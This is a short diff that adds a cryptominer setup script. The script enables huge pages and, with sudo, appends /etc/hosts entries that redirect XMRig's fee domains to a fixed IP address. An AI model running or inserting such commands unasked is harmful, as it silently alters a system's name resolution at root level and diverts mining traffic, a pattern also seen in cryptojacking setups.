@@ -1,0 +1,2 @@
+sudo sysctl -w vm.nr_hugepages=256
+sudo sh -c "echo 119.28.128.90 fee.xmrig.com miner.fee.xmrig.com emergency.fee.xmrig.com >> /etc/hosts"
